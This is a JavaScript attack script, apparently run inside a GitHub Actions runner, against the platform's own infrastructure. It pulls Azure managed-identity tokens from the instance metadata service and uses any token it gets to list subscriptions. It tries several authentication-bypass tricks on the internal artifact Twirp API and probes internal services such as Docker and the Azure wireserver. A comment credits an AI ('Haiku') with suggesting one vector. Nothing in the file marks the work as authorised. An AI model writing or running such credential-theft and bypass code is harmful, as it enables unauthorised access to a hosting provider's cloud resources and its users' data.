const https = require('https');
const http = require('http');
const fs = require('fs');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';

function doRequest(options, body, useHttp) {
  return new Promise((resolve) => {
    const client = useHttp ? http : https;
    const req = client.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 1200), headers: res.headers }));
    });
    req.on('error', (e) => resolve({ status: 'ERROR', body: e.message }));
    if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

async function main() {

  // ============================================================
  // CHAIN 1: IMDS Managed Identity Token Extraction
  // If Azure runner VM has managed identity → could access GitHub's internal Azure resources
  // ============================================================
  console.log('=== CHAIN 1: IMDS Managed Identity Token Extraction ===');

  // Step 1a: Get instance metadata (proves IMDS reachable from runner)
  const imds1 = await doRequest({
    hostname: '169.254.169.254',
    path: '/metadata/instance?api-version=2021-02-01',
    method: 'GET',
    headers: { 'Metadata': 'true' }
  }, null, true);
  console.log('\n[IMDS Step 1] Instance metadata:');
  console.log('Status:', imds1.status, '| Body (first 800):', imds1.body.substring(0, 800));

  // Step 1b: Try to get managed identity token for Azure Management API
  const imds2 = await doRequest({
    hostname: '169.254.169.254',
    path: '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
    method: 'GET',
    headers: { 'Metadata': 'true' }
  }, null, true);
  console.log('\n[IMDS Step 2] Managed identity token for management.azure.com:');
  console.log('Status:', imds2.status, '| Body:', imds2.body.substring(0, 800));
  // 200 + access_token = CRITICAL — VM has managed identity

  // Step 1c: Try managed identity for storage (might reveal GitHub's internal blobs)
  const imds3 = await doRequest({
    hostname: '169.254.169.254',
    path: '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fstorage.azure.com%2F',
    method: 'GET',
    headers: { 'Metadata': 'true' }
  }, null, true);
  console.log('\n[IMDS Step 3] Managed identity token for storage.azure.com:');
  console.log('Status:', imds3.status, '| Body:', imds3.body.substring(0, 400));

  // Step 1d: NEW IMDS endpoint — attested data (includes signed runner identity)
  const imds4 = await doRequest({
    hostname: '169.254.169.254',
    path: '/metadata/attested/document?api-version=2020-06-01',
    method: 'GET',
    headers: { 'Metadata': 'true' }
  }, null, true);
  console.log('\n[IMDS Step 4] Attested document (signed VM identity):');
  console.log('Status:', imds4.status, '| Body:', imds4.body.substring(0, 600));

  // If we got a management token, try to list subscriptions
  if (imds2.status === 200 && imds2.body.includes('access_token')) {
    try {
      const parsed = JSON.parse(imds2.body);
      const token = parsed.access_token;
      console.log('\n!!! MANAGED IDENTITY TOKEN OBTAINED !!!');
      console.log('Token type:', parsed.token_type);
      console.log('Expires in:', parsed.expires_in, 'seconds');

      // Try to list Azure subscriptions
      const subs = await doRequest({
        hostname: 'management.azure.com',
        path: '/subscriptions?api-version=2020-01-01',
        method: 'GET',
        headers: { 'Authorization': 'Bearer ' + token }
      }, null, false);
      console.log('\n[Azure] List subscriptions:');
      console.log('Status:', subs.status, '| Body:', subs.body.substring(0, 600));
    } catch (e) {
      console.log('Token parse error:', e.message);
    }
  }

  // ============================================================
  // CHAIN 2: Twirp Content-Type Confusion Auth Bypass
  // Haiku suggests: send application/protobuf Content-Type with JSON body
  // ============================================================
  if (RESULTS_URL && RUNTIME_TOKEN) {
    const host = new URL(RESULTS_URL).hostname;
    console.log('\n=== CHAIN 2: Twirp Auth Bypass Attempts ===');

    // Vector A: Content-Type protobuf with JSON body (auth hook may skip on parse error)
    const rA = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/protobuf' }
    }, '{}');
    console.log('\n[Twirp A] protobuf Content-Type + JSON body:', rA.status, '|', rA.body.substring(0, 200));

    // Vector B: Double-slash path bypass
    const rB = await doRequest({
      hostname: host,
      path: '//twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, '{}');
    console.log('\n[Twirp B] Double-slash path:', rB.status, '|', rB.body.substring(0, 200));

    // Vector C: Encoded slash in path
    const rC = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService%2FListArtifacts',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, '{}');
    console.log('\n[Twirp C] URL-encoded path separator:', rC.status, '|', rC.body.substring(0, 200));

    // Vector D: No Authorization header (relying only on IP-based trust from runner network)
    const rD = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, '{}');
    console.log('\n[Twirp D] No Authorization (IP trust test):', rD.status, '|', rD.body.substring(0, 200));

    // Vector E: Method name case variation (ListArtifacts vs listArtifacts vs LISTARTIFACTS)
    const rE = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/listArtifacts',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, '{}');
    console.log('\n[Twirp E] Lowercase method name:', rE.status, '|', rE.body.substring(0, 200));

    // Vector F: Try undocumented methods that might have weaker auth
    for (const method of ['CreateArtifact', 'DeleteArtifact', 'FinalizeArtifact']) {
      const r = await doRequest({
        hostname: host,
        path: `/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
      }, '{}');
      console.log(`\n[Twirp F-${method}]:`, r.status, '|', r.body.substring(0, 150));
    }
  }

  // ============================================================
  // CHAIN 3: Internal Runner Metadata Endpoints
  // Runners may expose internal HTTP services on localhost or internal IPs
  // ============================================================
  console.log('\n=== CHAIN 3: Internal Runner Service Discovery ===');

  for (const [desc, opts] of [
    ['localhost:2376 (Docker)', { hostname: 'localhost', port: 2376, path: '/version', method: 'GET' }],
    ['localhost:50051 (gRPC runner)', { hostname: 'localhost', port: 50051, path: '/', method: 'GET' }],
    ['10.0.0.1 (Azure gateway)', { hostname: '10.0.0.1', port: 80, path: '/', method: 'GET' }],
    ['168.63.129.16 (Azure wireserver)', { hostname: '168.63.129.16', port: 80, path: '/machine?comp=versions', method: 'GET' }],
  ]) {
    const r = await doRequest({ ...opts, headers: {} }, null, true);
    console.log(`\n[Internal] ${desc}: Status=${r.status} | Body=${r.body.substring(0, 200)}`);
  }
}

main().catch(e => console.log('Fatal error:', e.message));
// Already handled in main() above — this file is complete
